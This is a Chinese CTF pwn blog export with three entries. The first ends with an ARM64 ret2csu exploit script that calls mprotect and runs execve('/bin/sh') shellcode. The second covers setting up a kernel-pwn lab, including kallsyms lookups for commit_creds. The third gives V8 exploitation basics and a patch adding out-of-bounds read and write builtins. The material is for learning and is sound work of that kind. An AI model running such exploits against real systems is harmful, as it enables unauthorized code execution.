<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:00000000004008AC                               loc_4008AC                              ; CODE XREF: init+60↓j</span><br><span class="line">.text:00000000004008AC A3 7A 73 F8                   LDR             X3, [X21,X19,LSL#3]</span><br><span class="line">.text:00000000004008B0 E2 03 16 AA                   MOV             X2, X22</span><br><span class="line">.text:00000000004008B4 E1 03 17 AA                   MOV             X1, X23</span><br><span class="line">.text:00000000004008B8 E0 03 18 2A                   MOV             W0, W24</span><br><span class="line">.text:00000000004008BC 73 06 00 91                   ADD             X19, X19, #1</span><br><span class="line">.text:00000000004008C0 60 00 3F D6                   BLR             X3</span><br><span class="line">.text:00000000004008C0</span><br><span class="line">.text:00000000004008C4 7F 02 14 EB                   CMP             X19, X20</span><br><span class="line">.text:00000000004008C8 21 FF FF 54                   B.NE            loc_4008AC</span><br><span class="line">.text:00000000004008C8</span><br><span class="line">.text:00000000004008CC</span><br><span class="line">.text:00000000004008CC                               loc_4008CC                              ; CODE XREF: init+3C↑j</span><br><span class="line">.text:00000000004008CC F3 53 41 A9                   LDP             X19, X20, [SP,#var_s10]</span><br><span class="line">.text:00000000004008D0 F5 5B 42 A9                   LDP             X21, X22, [SP,#var_s20]</span><br><span class="line">.text:00000000004008D4 F7 63 43 A9                   LDP             X23, X24, [SP,#var_s30]</span><br><span class="line">.text:00000000004008D8 FD 7B C4 A8                   LDP             X29, X30, [SP+var_s0],#0x40</span><br><span class="line">.text:00000000004008DC C0 03 5F D6                   RET</span><br></pre></td></tr></table></figure>

<p>直接从栈上就可控制寄存器，控制寄存器执行mprotect，执行shellcode，注意要对齐，</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line">from ownpwn.mypwn import *</span><br><span class="line">io=setup(&quot;./pwn&quot;,arch=&quot;arm64&quot;,arch_lib=&quot;/usr/aarch64-linux-gnu/&quot;,gdb_port=&quot;1234&quot;)</span><br><span class="line"></span><br><span class="line">csu_1=0x4008CC</span><br><span class="line">csu_2=0x4008AC</span><br><span class="line"></span><br><span class="line">mprotect_plt=0x400600</span><br><span class="line"></span><br><span class="line">shellcode=asm(shellcraft.execve(&quot;/bin/sh&quot;))</span><br><span class="line">offset=72</span><br><span class="line">payload1=p64(mprotect_plt)+shellcode</span><br><span class="line">sa(&quot;Name:&quot;,payload1)</span><br><span class="line"></span><br><span class="line">payload2=cyclic(offset)+p64(csu_1)+p64(0xdeadbeef)+p64(csu_2)+p64(0)+p64(1)+p64(0x411068)+p64(7)+p64(0x268)+p64(0x411000)+p64(0)+p64(0x411068+8)</span><br><span class="line"></span><br><span class="line">s(payload2)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
]]></content>
      <tags>
        <tag>pwn</tag>
        <tag>arm</tag>
      </tags>
  </entry>
  <entry>
    <title>Kernel-1</title>
    <url>/2024/07/12/Kernel-1/</url>
    <content><![CDATA[<p><a href="https://ctf-wiki.org/pwn/linux/kernel-mode/environment/build-kernel/">内核下载与编译 - CTF Wiki (ctf-wiki.org)</a></p>
<p><a href="https://www.bilibili.com/video/BV1Uv411j7fr/?p=29&vd_source=6b0fdd231a052436bd9b2c1c6bd27e40">29、内核pwn环境搭建_哔哩哔哩_bilibili</a></p>
<p>[<a href="https://bbs.kanxue.com/thread-271226.htm">原创]Linux内核入门——驱动模块-Pwn-看雪-安全社区|安全招聘|kanxue.com</a></p>
<p><a href="https://arttnba3.cn/2021/02/21/OS-0X01-LINUX-KERNEL-PART-II/#0x00-%E4%B8%80%E5%88%87%E5%BC%80%E5%A7%8B%E4%B9%8B%E5%89%8D">【OS.0x01】Linux Kernel II：内核简易食用指北 - arttnba3’s blog</a></p>
<p><a href="https://blog.csdn.net/qq_54218833/article/details/124360103">Kernel Pwn 入门 (1)_内核pwn-CSDN博客</a></p>
<h1 id="内核编译"><a href="#内核编译" class="headerlink" title="内核编译"></a>内核编译</h1><p>从<code>https://www.kernel.org</code>获取内核</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">~/kernel/linux-5.4.98</span><br><span class="line">$ make menuconfig</span><br><span class="line">//设置Kernel hacking -&gt; Compile-time checks and compiler options -&gt; Compile the kernel with debug info</span><br><span class="line">$ make -j3 bzImage</span><br></pre></td></tr></table></figure>

<p>出现如下信息时</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Setup is 18012 bytes (padded to 18432 bytes).</span><br><span class="line">System is 9189 kB</span><br><span class="line">CRC df09b895</span><br><span class="line">Kernel: arch/x86/boot/bzImage is ready  (#1)</span><br></pre></td></tr></table></figure>

<p>意味着编译成功。</p>
<ul>
<li><strong>bzImage</strong>：目前主流的 kernel 镜像格式，即 big zImage（即 bz 不是指 bzip2），适用于较大的（大于 512 KB） Kernel。这个镜像会被加载到内存的高地址，高于 1MB。bzImage 是用 gzip 压缩的，文件的开头部分有 gzip 解压缩的代码，所以我们不能用 gunzip 来解压缩。</li>
<li><strong>zImage</strong>：比较老的 kernel 镜像格式，适用于较小的（不大于 512KB） Kernel。启动时，这个镜像会被加载到内存的低地址，即内存的前 640 KB。zImage 也不能用 gunzip 来解压缩。</li>
<li><strong>vmlinuz</strong>：vmlinuz 不仅包含了压缩后的 vmlinux，还包含了 gzip 解压缩的代码。实际上就是 zImage 或者 bzImage 文件。该文件是 bootable 的。 bootable 是指它能够把内核加载到内存中。对于 Linux 系统而言，该文件位于 &#x2F;boot 目录下。该目录包含了启动系统时所需要的文件。</li>
<li><strong>vmlinux</strong>：静态链接的 Linux kernel，以可执行文件的形式存在，尚未经过压缩。该文件往往是在生成 vmlinuz 的过程中产生的。该文件适合于调试。但是该文件不是 bootable 的。</li>
<li><strong>vmlinux.bin</strong>：也是静态链接的 Linux kernel，只是以一个可启动的 (bootable) 二进制文件存在。所有的符号信息和重定位信息都被删除了。生成命令为：<code>objcopy -O binary vmlinux vmlinux.bin</code>。</li>
<li><strong>uImage</strong>：uImage 是 U-boot 专用的镜像文件，它是在 zImage 之前加上了一个长度为 0x40 的 tag 而构成的。这个 tag 说明了这个镜像文件的类型、加载位置、生成时间、大小等信息。</li>
</ul>
<h1 id="编译内核模块"><a href="#编译内核模块" class="headerlink" title="编译内核模块"></a>编译内核模块</h1><p>LKM(Loadable Kernel Modules，可加载核心模块)同样是ELF文件，可单独编译但不能单独运行，只能作为内核中的一部分，可用ida分析</p>
<p>模块通常用来实现一种文件系统、一个驱动程序或者其他内核上层的功能。</p>
<blockquote>
<p>Linux 内核之所以提供模块机制，是因为它本身是一个单内核 (monolithic kernel)。单内核的优点是效率高，因为所有的内容都集合在一起，但缺点是可扩展性和可维护性相对较差，模块机制就是为了弥补这一缺陷。</p>
</blockquote>
<h2 id="相关指令"><a href="#相关指令" class="headerlink" title="相关指令"></a>相关指令</h2><ul>
<li><strong>insmod</strong>: 讲指定模块加载到内核中</li>
<li><strong>rmmod</strong>: 从内核中卸载指定模块</li>
<li><strong>lsmod</strong>: 列出已经加载的模块</li>
<li><strong>modprobe</strong>: 添加或删除模块，modprobe 在加载模块时会查找依赖关系</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo apt-get install build-essential</span><br></pre></td></tr></table></figure>

<p>自己编译一个模块</p>
<p>起名为<code>hello.c</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include &lt;linux/module.h&gt;</span><br><span class="line">#include &lt;linux/kernel.h&gt;</span><br><span class="line">#include &lt;linux/init.h&gt;</span><br><span class="line"></span><br><span class="line">static int __init kernel_module_init(void)</span><br><span class="line">&#123;</span><br><span class="line">    printk(&quot;&lt;1&gt;Hello the Linux kernel world!\n&quot;);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">static void __exit kernel_module_exit(void)</span><br><span class="line">&#123;</span><br><span class="line">    printk(&quot;&lt;1&gt;Good bye the Linux kernel world! See you again!\n&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">module_init(kernel_module_init);</span><br><span class="line">module_exit(kernel_module_exit);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li><code>linux/module.h</code>：对于LKM而言这是必须包含的一个头文件</li>
<li><code>linux/kernel.h</code>：载入内核相关信息</li>
<li><code>linux/init.h</code>：包含着一些有用的宏</li>
</ul>
<p>一个内核模块的入口点应当为<code> module_init()</code>，出口函数应当为<code>module_exit()</code>，在内核载入&#x2F;卸载内核模块时会缺省调用这两个函数</p>
<ul>
<li><code>__init &amp; __exit</code>：这两个宏用以在函数结束后释放相应的内存</li>
<li><code>MODULE_AUTHOR() &amp; MODULE_LICENSE()</code>：声明内核作者与发行所用许可证</li>
<li><code>printk()</code>：内核态函数，用以在内核缓冲区写入信息，其中<code>&lt;1&gt;</code>标识着信息的紧急级别（一共有8个优先级，0为最高，相关宏定义于linux&#x2F;kernel.h中）</li>
</ul>
<p>如下是<code>Makefile</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">obj-m += hello.o</span><br><span class="line">CURRENT_PATH := $(shell pwd)</span><br><span class="line">LINUX_KERNEL := 5.4.98</span><br><span class="line">LINUX_KERNEL_PATH := /root/kernel/linux-$(LINUX_KERNEL)</span><br><span class="line">all:</span><br><span class="line">	make -C $(LINUX_KERNEL_PATH) M=$(CURRENT_PATH) modules</span><br><span class="line">clean:</span><br><span class="line">	make -C $(LINUX_KERNEL_PATH) M=$(CURRENT_PATH) clean</span><br></pre></td></tr></table></figure>

<ul>
<li><code>obj-m</code>： 指定了编译的结果应当为<code>.ko</code>文件，即可装载内核模块，类似命令有： <code>obj-y</code> 编译进内核 ，<code>obj-n</code> 不编译</li>
<li><code>CURRENT_PATH &amp; LINUX_KERNEL &amp; LINUX_KERNEL_PATH</code>：三个自定义变量，分别意味着通过shell命令获得当前路径、内核版本、内核源码路径</li>
<li><code>all</code>：编译指令</li>
<li><code>clean</code>：清理指令</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">make</span><br></pre></td></tr></table></figure>

<p>这里要注意<code>tap</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//输出这样的信息表示编译成功</span><br><span class="line">make -C /root/kernel/linux-5.4.98 M=/root/kernel/moud modules</span><br><span class="line">make[1]: Entering directory &#x27;/root/kernel/linux-5.4.98&#x27;</span><br><span class="line">  CC [M]  /root/kernel/moud/hello.o</span><br><span class="line">  Building modules, stage 2.</span><br><span class="line">  MODPOST 1 modules</span><br><span class="line">WARNING: modpost: missing MODULE_LICENSE() in /root/kernel/moud/hello.o</span><br><span class="line">see include/linux/module.h for more information</span><br><span class="line">  CC [M]  /root/kernel/moud/hello.mod.o</span><br><span class="line">  LD [M]  /root/kernel/moud/hello.ko</span><br><span class="line">make[1]: Leaving directory &#x27;/root/kernel/linux-5.4.98&#x27;</span><br></pre></td></tr></table></figure>

<h1 id="busybox编译-构建文件系统"><a href="#busybox编译-构建文件系统" class="headerlink" title="busybox编译(构建文件系统)"></a>busybox编译(构建文件系统)</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wget https://busybox.net/downloads/busybox-1.36.1.tar.bz2</span><br><span class="line">tar -jxf busybox-1.32.1.tar.bz2</span><br></pre></td></tr></table></figure>

<p>进行配置</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">make menuconfig</span><br></pre></td></tr></table></figure>

<p>配置中最重要一点是设置为静态编译</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Setttings -&gt; Build static binary (no shared libs)</span><br></pre></td></tr></table></figure>

<p>编译安装</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">make -j3 &amp;&amp; install</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">补充一下编译busybox遇到的问题</span><br><span class="line">1.缺少ncurses库,因为非标准的c导致的警告,在报错文件里的main前加个int就行</span><br><span class="line">	https://github.com/espressif/ESP8266_RTOS_SDK/issues/1283</span><br><span class="line">2.make[1]: *** [scripts/Makefile.build:197: networking/tc.o] Error 1</span><br><span class="line">	make[1]: *** Waiting for unfinished jobs.... </span><br><span class="line">	应该是不兼容较新的内核,一直到现在的1.37还没修,但所幸找到补丁了</span><br><span class="line">	https://bugs.busybox.net/show_bug.cgi?id=15931</span><br></pre></td></tr></table></figure>

<p>在编译完成后，我们在 <code>_install</code> 目录下创建以下文件夹</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">❯ mkdir -p  proc sys dev etc/init.d</span><br></pre></td></tr></table></figure>

<p>创建<code>init</code>为启动脚本</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#!/bin/sh</span><br><span class="line">echo &quot;INIT SCRIPT&quot;</span><br><span class="line">mkdir /tmp</span><br><span class="line">mount -t proc none /proc</span><br><span class="line">mount -t sysfs none /sys</span><br><span class="line">mount -t devtmpfs none /dev</span><br><span class="line">mount -t debugfs none /sys/kernel/debug</span><br><span class="line">mount -t tmpfs none /tmp</span><br><span class="line">echo -e &quot;Boot took $(cut -d&#x27; &#x27; -f1 /proc/uptime) seconds&quot;</span><br><span class="line">setsid /bin/cttyhack setuidgid 1000 /bin/sh</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chmod +x init</span><br></pre></td></tr></table></figure>

<p>打包文件系统</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">find . | cpio -o --format=newc &gt; ../rootfs.img</span><br></pre></td></tr></table></figure>

<p>ps:这个命令可以解包文件系统<code>cpio -idmv &lt; rootfs.img</code></p>
<h1 id="启动内核"><a href="#启动内核" class="headerlink" title="启动内核"></a>启动内核</h1><p>所需有：</p>
<ol>
<li>编译完成的内核</li>
<li>busybox构建的文件系统(rootfs.img)</li>
<li>qemu</li>
<li>LKM(可选)</li>
</ol>
<p>使用ctf-wiki中的脚本来启动</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#!/bin/sh</span><br><span class="line">qemu-system-x86_64 \</span><br><span class="line">    -m 64M \</span><br><span class="line">    -nographic \</span><br><span class="line">    -kernel ./bzImage \</span><br><span class="line">    -initrd  ./rootfs.img \</span><br><span class="line">    -append &quot;root=/dev/ram rw console=ttyS0 oops=panic panic=1 kaslr&quot; \</span><br><span class="line">    -smp cores=2,threads=1 \</span><br><span class="line">    -cpu kvm64</span><br></pre></td></tr></table></figure>

<p>此即为启动成功</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[    4.235165] clocksource: tsc: mask: 0xffffffffffffffff max_cycles: 0x2cd88e73b4e, max_idle_ns: 440795230258 ns</span><br><span class="line">[    4.236102] clocksource: Switched to clocksource tsc</span><br><span class="line">[    4.335487] ko_test: loading out-of-tree module taints kernel.</span><br><span class="line">[    4.342120] This is a test ko!</span><br><span class="line">Boot took 4.32 seconds</span><br><span class="line">~ # ls</span><br><span class="line">bin         etc         ko_test.ko  proc        sbin        tmp</span><br><span class="line">dev         init        linuxrc     root        sys         usr</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>在用 qemu 启动内核时，常用的选项如下</p>
<ul>
<li>-m， 指定 RAM 大小，默认 384M</li>
<li>-kernel，指定内核镜像文件 bzImage 路径</li>
<li>-initrd，设置内核启动的内存文件系统</li>
<li><code>-smp [cpus=]n[,cores=cores][,threads=threads][,dies=dies][,sockets=sockets][,maxcpus=maxcpus]</code>，指定使用到的核数。</li>
<li>-cpu，指定指定要模拟的处理器架构，可以同时开启一些保护，如<ul>
<li>+smap，开启 smap 保护</li>
<li>+smep，开启 smep 保护</li>
</ul>
</li>
<li>-nographic，表示不需要图形界面</li>
<li>-monitor，对 qemu 提供的控制台进行重定向，如果没有设置的话，可以直接进入控制台。</li>
<li>-append，附加选项<ul>
<li><code>nokaslr</code> 关闭随机偏移</li>
<li>console&#x3D;ttyS0，和 <code>nographic</code> 一起使用，启动的界面就变成了当前终端。</li>
</ul>
</li>
</ul>
<h2 id="加载模块"><a href="#加载模块" class="headerlink" title="加载模块"></a>加载模块</h2><p>将编译好的模块放入<code>文件系统目录</code>中</p>
<p>在<code>init</code>中加入<code>insmod /hello.ko</code></p>
<p>再次打包，就可在启动时加载模块了</p>
<h2 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h2><p>为了方便调试，设置为以root启动</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">- setsid /bin/cttyhack setuidgid 1000 /bin/sh</span><br><span class="line">+ setsid /bin/cttyhack setuidgid 0 /bin/sh</span><br></pre></td></tr></table></figure>

<p>同时关闭随机化</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#!/bin/sh</span><br><span class="line">qemu-system-x86_64 \</span><br><span class="line">    -m 64M \</span><br><span class="line">    -nographic \</span><br><span class="line">    -kernel ./bzImage \</span><br><span class="line">    -initrd  ./rootfs.img \</span><br><span class="line">    -append &quot;root=/dev/ram rw console=ttyS0 oops=panic panic=1 nokaslr&quot; \</span><br><span class="line">    -smp cores=2,threads=1 \</span><br><span class="line">    -cpu kvm64</span><br></pre></td></tr></table></figure>

<h2 id="基本操作"><a href="#基本操作" class="headerlink" title="基本操作"></a>基本操作</h2><p>获取内核特定符号地址</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">grep prepare_kernel_cred  /proc/kallsyms</span><br><span class="line">grep commit_creds  /proc/kallsyms</span><br></pre></td></tr></table></figure>

<p>查看装载的驱动</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">lsmod</span><br></pre></td></tr></table></figure>

<p>获取驱动加载的基地址</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># method 1</span><br><span class="line">grep target_module_name /proc/modules </span><br><span class="line"># method 2</span><br><span class="line">cat /sys/module/target_module_name/sections/.text </span><br></pre></td></tr></table></figure>

<p>&#x2F;sys&#x2F;module&#x2F; 目录下存放着加载的各个模块的信息。</p>
<h2 id="启动调试"><a href="#启动调试" class="headerlink" title="启动调试"></a>启动调试</h2><p>qemu可以启动调试服务</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">qemu -gdb dev</span><br></pre></td></tr></table></figure>

<p>同时提供了一个简写的方式</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">qemu -s </span><br></pre></td></tr></table></figure>

<p>即 </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">qemu -gdb tcp::1234</span><br></pre></td></tr></table></figure>

<p>然后在gdb中即可使用来连接调试</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">target remote localhost:1234</span><br></pre></td></tr></table></figure>

<h1 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h1><p><a href="https://github.com/ctf-wiki/ctf-challenges/blob/master/pwn/kernel/CISCN2017-babydriver/babydriver.tar">附件</a></p>
<p>解出三个文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">boot.sh 启动脚本</span><br><span class="line">bzImage	内核启动文件</span><br><span class="line">rootfs.cpio	根文件系统镜像</span><br></pre></td></tr></table></figure>

<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">➜  babydriver file rootfs.cpio   </span><br><span class="line">rootfs.cpio: gzip compressed data, last modified: Tue Jul  4 08:39:15 2017, max compression, from Unix, original size modulo 2^32 2844672</span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>V8-BASIC</title>
    <url>/2025/03/09/V8-ENVIONMENT/</url>
    <content><![CDATA[<h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><p>v8 是 Google 用 C++ 开发的一个开源 JavaScript 引擎.<br>简单来说, 就是执行 js 代码的一个程序.<br>Chromium, Node.js 都使用 v8 解析并运行 js.</p>
<p><a href="https://chromium.googlesource.com/v8/v8/">v8开源仓库</a></p>
<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><blockquote>
<p>Chromium and Chromium OS use a package of scripts called <a href="https://www.chromium.org/developers/how-tos/depottools"><strong>depot_tools</strong></a> to manage checkouts and code reviews.</p>
</blockquote>
<p>depot_tools，这个工具是专门用来搞Chromium开发的，<a href="https://commondatastorage.googleapis.com/chrome-infra-docs/flat/depot_tools/docs/html/depot_tools_tutorial.html#_setting_up">安装指南</a></p>
<p>ninja，编译v8的</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git clone https://chromium.googlesource.com/chromium/tools/depot_tools.git</span><br><span class="line">export PATH=/path/to/depot_tools:$PATH # 配置到环境变量里</span><br><span class="line">git clone https://github.com/ninja-build/ninja.git</span><br><span class="line">cd ninja &amp;&amp; ./configure.py --bootstrap &amp;&amp; cd ..</span><br><span class="line">echo &#x27;export PATH=$PATH:&quot;/root/ninja&quot;&#x27; &gt;&gt; ~/.bashr</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># get code</span><br><span class="line">fetch v8</span><br><span class="line">cd v8</span><br><span class="line"># 更新第三方仓库并预编译hook</span><br><span class="line">gclient sync</span><br></pre></td></tr></table></figure>

<p>执行 <code>./tools/dev/gm.py x64.release</code> 可以使用预设的选项编译 release 版本, 将 release 换成 debug 可以编译 debug 版本. 这样编译出来的文件在 <code>./out/x64.release</code> 或者 <code>./out/x64.debug</code> 下.</p>
<p>一般来说用默认的选项就可以. 编译这部分先这样，以后有什么要改的再来改.</p>
<h1 id="NSS入门v8题"><a href="#NSS入门v8题" class="headerlink" title="NSS入门v8题"></a>NSS入门v8题</h1><p>给了两个文件<code>app.py</code>和<code>changes_Myread_Mwrite.diff</code></p>
<p>这是个旧环境，照着旧环境<code>*CTF oob</code>改的，编译要用python2</p>
<h2 id="配置环境"><a href="#配置环境" class="headerlink" title="配置环境"></a>配置环境</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git reset --hard 6dc88c191f5ecc5389dc26efa3ca0907faef3598</span><br><span class="line"># 将v8版本reset和题目一致</span><br><span class="line">git apply &lt; changes_Myread_Mwrite.diff</span><br><span class="line"># 使用补丁文件</span><br><span class="line">tools/dev/v8gen.py x64.release</span><br><span class="line"># 用debug版本貌似有DCHECK的断言问题，我直接用release了</span><br></pre></td></tr></table></figure>

<p>调试脚本</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#!/bin/sh</span><br><span class="line">gdb -f ./d8 \</span><br><span class="line">-ex &quot;r --allow-natives-syntax $1&quot;</span><br></pre></td></tr></table></figure>

<h2 id="JS-Basic-Knowledge"><a href="#JS-Basic-Knowledge" class="headerlink" title="JS Basic Knowledge"></a>JS Basic Knowledge</h2><p>JS有几种基本数据类型：Undefined, Null, Boolean, String, Symbol, Number, Object.<br>数组和函数也是属于Object范畴内的。所以本节重点是分析Object类型。</p>
<p>V8 的地址分配是对齐字长的, 所以指针的后两位是 0，为了区分指针和SMI，将指针的最后一位设为了1。</p>
<p>先创建一个浮点数组，进gdb看看内存结构是怎么样的。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//var a=[2.1];</span><br><span class="line">pwndbg&gt; job 0x11bb5630de01</span><br><span class="line">0x11bb5630de01: [JSArray]</span><br><span class="line"> - map: 0x314778b42ed9 &lt;Map(PACKED_DOUBLE_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: 0x258d1bed1111 &lt;JSArray[0]&gt;</span><br><span class="line"> - elements: 0x11bb5630dde9 &lt;FixedDoubleArray[1]&gt; [PACKED_DOUBLE_ELEMENTS]</span><br><span class="line"> - length: 1</span><br><span class="line"> - properties: 0x2b1d18a80c71 &lt;FixedArray[0]&gt; &#123;</span><br><span class="line">    #length: 0x078f8fcc01a9 &lt;AccessorInfo&gt; (const accessor descriptor)</span><br><span class="line"> &#125;</span><br><span class="line"> - elements: 0x11bb5630dde9 &lt;FixedDoubleArray[1]&gt; &#123;</span><br><span class="line">           0: 2.1</span><br><span class="line"> &#125;</span><br><span class="line">pwndbg&gt; tele 0x11bb5630de00</span><br><span class="line">00:0000│  0x11bb5630de00 —▸ 0x314778b42ed9 ◂— 0x400002b1d18a801</span><br><span class="line">01:0008│  0x11bb5630de08 —▸ 0x2b1d18a80c71 ◂— 0x2b1d18a808</span><br><span class="line">02:0010│  0x11bb5630de10 —▸ 0x11bb5630dde9 ◂— 0x2b1d18a814</span><br><span class="line">03:0018│  0x11bb5630de18 ◂— 0x100000000</span><br><span class="line">04:0020│  0x11bb5630de20 —▸ 0x2b1d18a81cc9 ◂— 0x2b1d18a801</span><br><span class="line">05:0028│  0x11bb5630de28 ◂— 0x400000000</span><br><span class="line">06:0030│  0x11bb5630de30 ◂— 0x200000000</span><br><span class="line">07:0038│  0x11bb5630de38 ◂— 0</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>Object都是类似的结构，有map，properties，elements，length顺序连续</p>
<blockquote>
<p>map：用以识别对象的类型,指向 HiddenClass 的指针<br>properties和elements是两个独立存储的FixedArray ，分别是命名属性和编号属性<br>编号属性可以用整数下标访问，又称为元素<br>由于动态的原因，命名属性不能用固定下标检索，v8使用map transition机制来表示命名属性</p>
</blockquote>
<p>V8用两种方式来存储<code>命名属性</code>，分别是快速属性(<strong>Fast</strong> <strong>Properties</strong>)和慢速属性(<strong>Slow Properties</strong>)&#x2F;字典模式(<strong>Dictionary Mode</strong>)。</p>
<p>Fast Properties在每一次新增命名属性时，基于原本的Hidden class做转换，新建一个新的Hidden class，并维护两条有向边。<br>当命名属性变换多了，树形结构就不好维护，于是会转为字典属性，存储在Properties 中，通过哈希访问。</p>
<p>具体实现和结构请去V8官方文档或其他资料寻找，本文重点在于漏洞的利用</p>
<blockquote>
<p><a href="https://blog.wingszeng.top/v8-pwn-basics-1-jsobject/#fast-properties-and-map-transition">Wings-JSObject</a></p>
<p><a href="https://jhalon.github.io/chrome-browser-exploitation-1/">JS内部结构简介</a></p>
</blockquote>
<p>对上述内容通俗的讲就是，v8通过map来判断对象的类型</p>
<p>上面提到过在JS里，数组也是一种Object，在访问数组时一般会连续访问，所以编号属性就会直接存放在连续内存中。<br>这里也是真正存放数组的数据的地方。</p>
<p>V8对数组的元素类型进行了细分，PACKED_SMI_ELEMENTS(小整数)，PACKED_DOUBLE_ELEMENTS(浮点数型)，PACKED_ELEMENTS(其他), 依次包含。而且这种转换是单向的，不可复原。<br>除了元素类型，对数组空间是否全部使用也有分类：packed 表示数组空间全部使用，如<code>x = [1,2,3]</code>，而holey表示有空间未使用,如<code>x = [1,,3]</code>,同样 PACKED 到 HOLEY 也是一个单向的转换.</p>
<p>数组也有快速模式和慢速模式, 一般来说会使用快速模式, 即数组空间连续. 如果一个数组非常稀疏, 那么 V8 将会使用慢速模式, 创建一个字典来索引元素项目.</p>
<p>下面的是elements的内存结构，可以明显看到数据确切地存储在*elements+0x10的地方，只有<code>var a=[1.1];</code>和<code>var a=[b];//b为一个对象</code>这种情况才是这种内存结构。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; job 0x11bb5630dde9</span><br><span class="line">0x11bb5630dde9: [FixedDoubleArray]</span><br><span class="line"> - map: 0x2b1d18a814f9 &lt;Map&gt;</span><br><span class="line"> - length: 1</span><br><span class="line">           0: 2.1</span><br><span class="line">pwndbg&gt; tele 0x11bb5630dde8</span><br><span class="line">00:0000│  0x11bb5630dde8 —▸ 0x2b1d18a814f9 ◂— 0x2b1d18a801</span><br><span class="line">01:0008│  0x11bb5630ddf0 ◂— 0x100000000</span><br><span class="line">02:0010│  0x11bb5630ddf8 ◂— 0x4000cccccccccccd</span><br><span class="line">03:0018│  0x11bb5630de00 —▸ 0x314778b42ed9 ◂— 0x400002b1d18a801</span><br><span class="line">04:0020│  0x11bb5630de08 —▸ 0x2b1d18a80c71 ◂— 0x2b1d18a808</span><br><span class="line">05:0028│  0x11bb5630de10 —▸ 0x11bb5630dde9 ◂— 0x2b1d18a814</span><br><span class="line">06:0030│  0x11bb5630de18 ◂— 0x100000000</span><br><span class="line">07:0038│  0x11bb5630de20 —▸ 0x2b1d18a81cc9 ◂— 0x2b1d18a801</span><br><span class="line">pwndbg&gt; x /fg 0x11bb5630ddf8</span><br><span class="line">0x11bb5630ddf8: 2.1000000000000001</span><br></pre></td></tr></table></figure>

<h2 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h2><p>一般的题目都是给的魔改v8(当然也有直接给cve让写的)，先给你一个特定的v8版本，然后在这个v8的基础上打一些补丁</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">+++ b/src/bootstrapper.cc</span><br><span class="line">+    SimpleInstallFunction(isolate_, proto, &quot;Myread&quot;,</span><br><span class="line">+                          Builtins::kMyread, 1, false);</span><br><span class="line">+    SimpleInstallFunction(isolate_, proto, &quot;Mywrite&quot;,</span><br><span class="line">+                          Builtins::kMywrite, 2, false);</span><br></pre></td></tr></table></figure>

<p>先是给新加了两个函数，分别是Myread和Mywrite，其实就是把*ctf的oob分成了两个函数，分别期望1，2个参数(包括this参数)，且这两个函数不是构造函数</p>
<p>接下来是两个函数的实现</p>
